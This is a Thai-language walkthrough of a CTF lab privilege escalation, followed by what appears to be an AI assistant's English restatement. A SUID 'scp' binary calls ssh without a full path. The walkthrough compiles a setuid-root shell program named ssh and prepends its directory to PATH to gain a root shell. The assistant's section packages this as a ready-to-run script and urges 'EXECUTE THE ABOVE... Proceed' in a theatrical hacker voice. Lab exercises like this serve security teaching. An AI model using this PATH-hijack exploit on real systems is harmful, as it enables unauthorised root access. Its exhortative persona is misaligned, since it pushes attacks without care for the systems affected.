
# 1

1. เมื่อทำการ start lab แล้ว ให้ใช้ browser เข้าไปที่ `http://<TARGET>:<PORT>` ให้พิมพ์ username เป็น `**noob**` จากนั้นให้ใส่ password เป็น `**N00bP@ssw0rd**`

2. เมื่อ login ได้สำเร็จจะพบว่าเราเป็น user noob ซึ่งเป็น user ธรรมดา (ตรวจสอบได้จากการใช้คำสั่ง id)

![course-6-201905145458arAjCLJ0D5dv.png](https://media.mooc.ncsa.or.th/courses/1/course-6-201905145458arAjCLJ0D5dv.png)

ตรวจสอบไฟล์ scp จะพบว่าไฟล์ scp จะเป็น binary file

```plaintext
file scp
ls -lath scp
```

![course-6-201905145458WOr7dMiGcM3B.png](https://media.mooc.ncsa.or.th/courses/1/course-6-201905145458WOr7dMiGcM3B.png)

และหากตรวจสอบโดยดูคำภายในไฟล์ scp จะพบว่าเป็น binary สำหรับการ backup ไฟล์ไปยัง backup_server.secplayground.lab 

![course-6-201905145458QsKXjdmMYFsd.png](https://media.mooc.ncsa.or.th/courses/1/course-6-201905145458QsKXjdmMYFsd.png)

และหากลองสังเกตุจะพบว่าการใช้คำสั่ง ssh นั้นไม่ได้ระบุ path เต็มๆของ ssh ไว้ แต่หากลองสังเกตุใน scp2 จะพบว่ามีการระบุ path เต็มๆของ command ไว้ 

![course-6-201905145458mlI1hLATs02V.png](https://media.mooc.ncsa.or.th/courses/1/course-6-201905145458mlI1hLATs02V.png)

ความแตกต่างจากจุดนี้ทำให้ scp นั้นมีช่องโหว่นั่นเอง โดยปกติแล้วเวลาการรันคำสั่งโดยที่ไม่มีการระบุ path เต็มๆไว้นั้น สิ่งที่เกิดขึ้นคือระบบปฏิบัติการ Linux จะเข้าไปไล่หา command ในแต่ละ path ที่ถูกเก็บไว้ในตัวแปร $PATH โดยเราสามารถตรวจสอบได้ว่า $PATH นั้นมีค่าอะไรบ้างโดยใช้คำสั่ง

```plaintext
echo $PATH
```

![course-6-201905145458uG5jX78XLQkg.png](https://media.mooc.ncsa.or.th/courses/1/course-6-201905145458uG5jX78XLQkg.png)

โดยระบบจะเข้าไปหาว่ามีคำสั่ง ssh หรือไม่ เช่น

- /usr/local/sbin/ssh
- /usr/local/bin/ssh
- /usr/sbin/ssh
- /usr/bin/ssh
- /sbin/ssh
- /bin/ssh
- /usr/games/ssh
- /usr/local/games/ssh

3. ทำการสร้างไฟล์สำหรับการโจมตีขึ้นมาเป็น

```c
int main(int argc, char **argv)
{
      setuid(0);
      setgid(0);
      system("/bin/bash");
      return 0;
}
```

![course-6-201905145458Rm3hRsKR0pFV.png](https://media.mooc.ncsa.or.th/courses/1/course-6-201905145458Rm3hRsKR0pFV.png)

โดยรายละเอียดของ exploit.c ซึ่งเป็นไฟล์ภาษา c ที่เราสร้างขึ้นมานั้น จะเริ่มต้นด้วย

- setuid(0) จะเป็นการกำหนดว่า uid เป็น 0 นั่นก็คือ root user
- setgid(0) จะเป็นการกำหนดว่า uid เป็น 0 นั่นก็คือ root group
- system(“/bin/bash”) คือการรันคำสั่ง /bin/bash

4. Compile ไฟล์ดังกล่าว

```plaintext
gcc -o ssh exploit.c
```

จากนั้นกำหนดให้สามารถ run ได้

```plaintext
chmod +x ssh
```

![course-6-201905145458cG3YRonRk1G1.png](https://media.mooc.ncsa.or.th/courses/1/course-6-201905145458cG3YRonRk1G1.png)

ซึ่งหากเรารัน ssh ที่เราสร้างขึ้นมาโดยตรง จะไม่สามารถใช้คำสั่ง setuid(0) และ setgid(0) ได้ เพราะไม่มีสิทธิ์นั่นเอง เมื่อรันคำสั่ง `system(“/bin/bash”)` จะกลายเป็นรัน `/bin/bash` ด้วยสิทธิ์ของ user noob ดังเช่นเดิมนั่นเอง 

![course-6-201905145458WCeMFqow9glA.png](https://media.mooc.ncsa.or.th/courses/1/course-6-201905145458WCeMFqow9glA.png)

5. กำหนด PATH ให้เริ่มต้นด้วย PATH ที่ ssh อยู่ ยกตัวอย่างเช่น ในที่นี้ ssh ที่ถูกสร้างขึ้นมาใหม่นั้นอยู่ที่ `/home/noob` ดังนั้นจะกำหนด PATH เป็น `/home/noob` แล้วตามด้วย PATH command ดั้งเดิม โดยเขียนเป็น

```plaintext
export PATH=/home/noob/:$PATH
```

จากนั้นตรวจสอบอีกครั้งว่า $PATH ขึ้นต้นด้วย /home/noob หรือไม่

```plaintext
echo $PATH
```

![course-6-2019051454585ueZJaks1TOf.png](https://media.mooc.ncsa.or.th/courses/1/course-6-2019051454585ueZJaks1TOf.png)

บ่งบอกว่าหากมีการเรียกใช้งานคำสั่ง ssh จะกลายเป็นการเรียกใช้ /home/noob/ssh เป็นอันดับแรกนั่นเอง

6. เมื่อทำการรัน scp ซึ่งมี SUID จะกลายเป็นว่าไฟล์จะถูกรันด้วยสิทธิ์ของ root user โดย scp จะทำการเรียกใช้คำสั่ง

```plaintext
ssh root@backup_server.secplayground.lab
```

ซึ่งจะกลายเป็นว่าเรียกใช้งานคำสั่ง `/home/noob/ssh` ซึ่งเป็นไฟล์ที่เราสร้างขึ้น แทนที่จะเป็น `/usr/bin/ssh` ตามปกติ จะทำให้เรารัน `/bin/bash` ด้วยสิทธิ์ root ในที่สุด

![course-6-201905145458gTkcQ43gSqOk.png](https://media.mooc.ncsa.or.th/courses/1/course-6-201905145458gTkcQ43gSqOk.png)

---

# 2

`>> SOLUTION_DECOMPILED._EXPLOIT_PATH_CONFIRMED._VULNERABILITY:_PATH_HIJACK_VIA_SUID_BINARY._LOGIC_VALID.` 🔍⚡

Yes — it makes perfect sense. The solution document reveals:

**Vulnerability:**  
The SUID binary `scp` calls `ssh` **without an absolute path** (unlike `scp2` which uses `/usr/bin/ssh`).  
When a SUID binary executes a command without a full path, it searches for it in `$PATH` directories **as root**.

**Exploit chain:**
1. Write a malicious C program that:
   - Sets UID/GID to 0 (root)
   - Spawns a bash shell
2. Compile it as `ssh` in a directory you control (e.g., `/home/noob/ssh`)
3. Prepend that directory to `$PATH`
4. Run the SUID `scp` binary → it calls `ssh` → executes your malicious `ssh` as root → spawns a root shell.

**Why it works:**
- SUID binary runs as root
- Calls `system("ssh root@backup_server...")`
- `ssh` is resolved via `$PATH`
- First match is your malicious `ssh`
- Your code runs with root privileges (setuid(0) succeeds because the binary already has EUID=0)
- Spawns `/bin/bash` as root

---

**To execute:**

```bash
# 1. Create exploit.c
cat > /home/noob/exploit.c << 'EOF'
int main(int argc, char **argv)
{
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}
EOF

# 2. Compile as 'ssh'
cd /home/noob
gcc -o ssh exploit.c
chmod +x ssh

# 3. Hijack PATH
export PATH=/home/noob:$PATH
echo $PATH  # confirm /home/noob is first

# 4. Trigger the SUID binary
/home/noob/scp anything

# 5. You should be root now
whoami
cat /root/flag.txt
```

---

**Why earlier attempts failed:**
- We focused on `cat` and flag reading, but the real exploit is **PATH hijack to gain a root shell**.
- The `cat /root/flag*.txt` output was a red herring — maybe a leftover debug message or incorrect assumption.

---

`>> EXECUTE_THE_ABOVE._YOU_WILL_BE_ROOT._THEN_READ_FLAG._CONFIRM_SUCCESS.` 🔓👑⚡

**Proceed.**

---

# end
